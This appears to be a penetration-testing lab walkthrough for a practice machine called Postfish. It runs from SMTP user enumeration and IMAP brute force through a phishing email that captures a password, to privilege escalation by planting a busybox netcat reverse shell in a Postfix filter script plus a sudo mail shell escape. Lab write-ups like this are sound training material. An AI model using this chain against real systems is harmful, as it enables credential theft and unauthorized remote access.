# System Information
OS: Linux
IP: 192.168.183.137

---
# Service Enumeration

## 22/tcp SSH
OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 

## 80/tcp HTTP
Apache/2.4.41 (Ubuntu)

Redirects to `http://postfish.off`. Add it to /etc/hosts.

![[Pasted image 20260829112304.png]]

http://postfish.off/team.html shows team members:

![[Pasted image 20260829112443.png]]

Use for SMTP user enum.

## 25/tcp SMTP

`./username-anarchy --input-file ~/oscp/postfish/names.txt > ~/oscp/postfish/usernames.txt`

`smtp-user-enum -U usernames-all -t $IP`

```
192.168.183.137: claire.madison exists
192.168.183.137: mike.ross exists
192.168.183.137: brian.moore exists
192.168.183.137: sarah.lorem exists
```

`smtp-user-enum -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP`

```
192.168.183.137: bin exists
192.168.183.137: hr exists
192.168.183.137: irc exists
192.168.183.137: mail exists
192.168.183.137: man exists
192.168.183.137: root exists
192.168.183.137: sales exists
192.168.183.137: sys exists
```

add all to usernames.txt


## 110/tcp Service

## 143/tcp Service

`hydra -L usernames -P usernames imap://$ip:143`

![[Pasted image 20260829122744.png]]

Find email in sales inbox:

```
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
        by postfish.off (Postfix) with SMTP id 7712145434
        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
```

`nc -lnvp 80`

`sendEmail -f it@postfish.off -t brian.moore@postfish.off -u 'http://192.168.45.194/' -m 'http://192.168.45.194/' -s postfish.off -v -o tls=no`

Receive HTTP:
```
connect to [192.168.45.194] from (UNKNOWN) [192.168.183.137] 57652
POST / HTTP/1.1
Host: 192.168.45.194
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```

Creds: brian.moore@postfish.off:EternaLSunshinE

Jump to Initial Access

## 993/tcp Service

## 995/tcp Service

# Initial Access

`ssh brian.moore@$IP` with password `EternaLSunshinE`

# Privilege Escalation

As a member of the `filter` group, we have rwx on `/etc/postfix/disclaimer`:

```
#!/bin/bash
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

####### Changed From Original Script #######
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
####### Changed From Original Script END #######

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

####### Changed From Original Script #######
# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi
####### Changed From Original Script END #######

$SENDMAIL "$@" <in.$$

exit $?
```

`/etc/postfix/disclaimer_addresses`:

```
it@postfish.off
brian.moore@postfish.off
```

If we add a reverse shell payload to the disclaimer script and send another email to one of the disclaimer_addresses, we should be able to get a reverse shell connection from `filter`.

add `busybox nc 192.168.45.194 443 -e /bin/bash` to `/etc/postfix/disclaimer`, then send another email `sendEmail -f asdf@postfish.off -t brian.moore@postfish.off -u 'http://192.168.45.194/' -m 'asdf' -s postfish.off -v -o tls=no`

![[Pasted image 20260829133230.png]]


https://gtfobins.org/gtfobins/mail/#shell

`sudo mail --exec='!/bin/sh'`

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260829133437.png]]